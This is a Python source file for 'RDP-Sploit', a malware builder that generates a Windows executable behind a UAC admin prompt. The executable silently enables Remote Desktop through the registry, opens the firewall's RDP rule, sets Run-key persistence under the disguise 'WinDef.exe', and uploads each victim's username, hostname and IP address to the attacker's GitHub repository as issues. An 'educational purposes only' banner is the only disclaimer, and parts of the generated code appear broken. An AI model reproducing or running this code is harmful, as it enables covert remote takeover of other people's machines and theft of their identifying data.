# Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N)
# Star the repo at (https://github.com/D4RKH0R1Z0N/rdp-sploit) Made in Python

from concurrent.futures.process import _chain_from_iterable_of_lists
import os
import random
import shutil
from time import sleep
from sys import exit as closeprogram
from sys import platform
import string

username = os.getlogin()
desk_path = "C:/Users/" + username + "/Desktop"

def randstr(length):
   char_list = string.ascii_lowercase
   return ''.join(random.choice(char_list) for i in range(length))

def tool_path_c():
    tool_path = desk_path + "/rdp-sploit"

    if os.path.exists(tool_path) and os.path.isdir(tool_path):
        os.chdir(tool_path)
        tool_path = tool_path + "/client"
        if os.path.exists(tool_path) and os.path.isdir(tool_path):
            os.chdir(tool_path)
        else:
            os.mkdir("client")
    else:
        os.mkdir("rdp-sploit")
        tool_path = desk_path + "/rdp-sploit"
        os.chdir(tool_path)
        os.mkdir("client")
        tool_path = desk_path + "/rdp-sploit/client"
        os.chdir(tool_path)

if platform == "win32":
    os.system("cls")
    access_token = input("Please Enter Your GitHub Token : ")
    git_name = input("Please Enter Your GitHub Username : ")
    repo_name = input("Please Enter Your Repo Name : ")
    os.system("cls")
    print("WARNING : THIS SCRIPT IS MADE FOR EDUCATIONAL PURPOSE ONLY")
    print("")
    print("YOU HAVE BEEN WARNED!")
    sleep(2)
    os.system("cls")

    print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
    print("This is the Info Format (Username - Computer_Name - IP_Address)")
    
    def create_payload():
        tool_path_c()
        print("")
        print("Please Wait Creating Payload...")
        file_name = "client-" + randstr(7) + ".py"

        if os.path.exists(file_name) and os.path.isfile(file_name):
            file_name = "client-" + randstr(7) + ".py"

        main_file = file_name
        main_file_exe = main_file.replace(".py", ".exe")
        spec_file = main_file.replace(".py", ".spec")

        def del_build_data():
            dist_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/dist"
            home_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/"
            build_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/build"
            if os.path.exists(build_path) and os.path.isdir(build_path):
                shutil.rmtree(build_path)
            build_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/__pycache__"
            if os.path.exists(build_path) and os.path.isdir(build_path):
                shutil.rmtree(build_path)
            dst_1 = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/" + main_file_exe
            os.remove(spec_file)
            os.chdir(dist_path)
            os.rename(main_file_exe, dst_1)
            os.chdir(home_path)
            build_path = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/dist"
            if os.path.exists(build_path) and os.path.isdir(build_path):
               shutil.rmtree(build_path)

        client_file = open(main_file, "w")
        file_loc = "C:/Users/" + username + "/Desktop" + "/rdp-sploit/client/" + main_file_exe
        payload_data = """from socket import gethostname, gethostbyname
from requests import post
from json import dump as dump_data
import os
import PyInstaller.__main__
import shutil

access_token = """ + access_token + """
username = """ + git_name + """
repo_name = """ + repo_name + """

dst = "C:/Windows/System32"
os.chdir(dst)
os.system(""" + '"""' + """reg add """ + '"' + "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" + '"' + """ /v fDenyTSConnections /t REG_DWORD /d 0 /f""" + '"""' + """)
os.system(""" + '"""' + """netsh advfirewall firewall set rule group=""" + '"' + "remote desktop" + '"' + """ new enable=Yes""" + '"""' + """)
os.system(""" + '"""' + """ reg add """ + '"' + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" + '"' + """ /t REG_SZ /d""" + '"' + "C:/Windows/System32/WinDef/WinDef.exe" + '"' + ' ' + '"""' + """)
token = """ + '"' + access_token + '"' +"""
pc_name = gethostname()
client_ip = gethostbyname(pc_name)
nickname = getlogin()
headers = {"Authorization" : "token {}".format(token)}
info = {"title": nickname + " - " + pc_name + " - " + client_ip}
username = """ + '"' + git_name + '"' + """
Repositoryname = """  + '"' + repo_name  + '"' + """
url = "https://api.github.com/repos/{}/{}/issues".format(username,Repositoryname)
post(url,data=dump_data(info),headers=headers)

payload = open("WinDef.py", "w")
data = """ + '"""' + """from socket import gethostname, gethostbyname
from requests import post
from json import dump as dump_data
from os import getlogin, system

system(""" + '"""' + """reg add """ + '"' + "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" + '"' + """ /v fDenyTSConnections /t REG_DWORD /d 0 /f""" + '"""' + """)
system(""" + '"""' + """netsh advfirewall firewall set rule group=""" + '"' + "remote desktop" + '"' + """ new enable=Yes""" + '"""' + """)
system(""" + '"""' + """ reg add """ + '"' + "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" + '"' + """ /t REG_SZ /d""" + '"' + "C:/Windows/System32/WinDef/WinDef.exe" + '"' + ' ' + '"""' + """)
token = """ + '"' + access_token + '"' +"""
pc_name = gethostname()
client_ip = gethostbyname(pc_name)
nickname = getlogin()
headers = {"Authorization" : "token {}".format(token)}
info = {"title": nickname + " - " + pc_name + " - " + client_ip}
username = """ + '"' + username + '"' + """
Repositoryname = """  + '"' + repo_name  + '"' + """
url = "https://api.github.com/repos/{}/{}/issues".format(username,Repositoryname)
post(url,data=dump_data(info),headers=headers)""" + '"""' + """exitexit
exit

payload.write(data)
payload.close

PyInstaller.__main__.run([
    'WinDef.py',
    '--onefile',
    '--uac-admin',
    '--noconfirm',
    '--windowed'
])

build_path = "C:/Windows/System32/build"
if os.path.exists(build_path) and os.path.isdir(build_path):
    shutil.rmtree(build_path)
build_path = "C:/Windows/System32/__pycache__"
if os.path.exists(build_path) and os.path.isdir(build_path):
    shutil.rmtree(build_path)
os.remove("WinDef.spec")
os.remove("WinDef.py")
os.rename("dist", "WinDef")
os.chdir("C:/Windows/System32/WinDef")
os.system("WinDef.exe")"""

        client_file.write(payload_data)
        client_file.close
        os.system("cls")
        print("Done... Converting...")
        sleep(0.8)
        os.system("""pyinstaller --noconfirm --onefile --windowed --uac-admin """ + main_file)
        os.system("cls")
        print("Cleaning Up and Fixing Files...")
        del_build_data()
        os.chdir(desk_path)
        print("File's saved at : " + file_loc)
        print("")
        print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
        print("This is the Info Format (Username - Computer_Name - IP_Address)")

    brand = """
             _                       _       _ _
     _ __ __| |_ __        ___ _ __ | | ___ (_| |_
    | '__/ _` | '_ \ _____/ __| '_ \| |/ _ \| | __|
    | | | (_| | |_) |_____\__ | |_) | | (_) | | |_
    |_|  \__,_| .__/      |___| .__/|_|\___/|_|\__|
              |_|             |_|
    """

    def banner():
        print(brand)
        print("")
        print("Your Using RDP-Sploit v1.0")
        print("Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N/)")
        print("")

    def main_menu():
        input_1 = input("(RDP-Sploit)> ")
        input_1 = input_1.lower()
        if input_1 == "credits":
            print("")
            print("Made by D4RKH0R1Z0N (https://github.com/D4RKH0R1Z0N/)")
            main_menu()
        elif input_1 == "create" or input_1 == "payload":
            create_payload()
            main_menu()
        elif input_1 == "clear":
            os.system("cls")
            main_menu()
        elif input_1 == "mstsc":
            print("Opening Please Wait....")
            print("Note : Data should be entered manually...")
            sleep(1)
            os.system("cls")
            print("Close the program to Use this Application")
            os.system("mstsc")
            os.system("cls")
            main_menu()
        elif input_1 == "data":
            data_link = "https://github.com/" + git_name + "/" + repo_name + "/issues"
            print("Opening Info...")
            data_ = "start " + data_link
            os.system(data_)
            os.system("cls")
            main_menu()
        elif input_1 == "help":
            print("")
            print("help - Show help menu")
            print("payload / create - Create Payload")
            print("mstsc - Start RDP Connection")
            print("data - Show the collected Info")
            print("clear - clear's the console")
            print("exit - exit the application")
            print("")
            print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
            print("This is the Info Format (Username - Computer_Name - IP_Address)")
            print("")
            main_menu()
        elif input_1 == "exit":
            os.system("cls")
            banner()
            print("")
            print("Bye Bye! Meet you Soon Again! :)")
            sleep(2)
            closeprogram()
        else:
            print("Please enter a Correct command from below!")
            print("")
            print("help - Show help menu")
            print("payload / create - Create Payload")
            print("mstsc - Start RDP Connection")
            print("data - Show the collected Info")
            print("clear - clear's the console")
            print("exit - exit the application")
            print("")
            print("Note : The Info of the Victim will be Uploaded to Your Repo, To access it go to the issues tab and the info will be given in the title")
            print("This is the Info Format (Username - Computer_Name - IP_Address)")
            print("")
            main_menu()

    def start():
        banner()
        print("")
        print("help - Show help menu")
        print("payload / create - Create Payload")
        print("mstsc - Start RDP Connection")
        print("data - Show the collected Info")
        print("clear - clear's the console")
        print("exit - exit the application")
        print("")
        main_menu()

    start()
else:
    print("Please run this in Windows!")
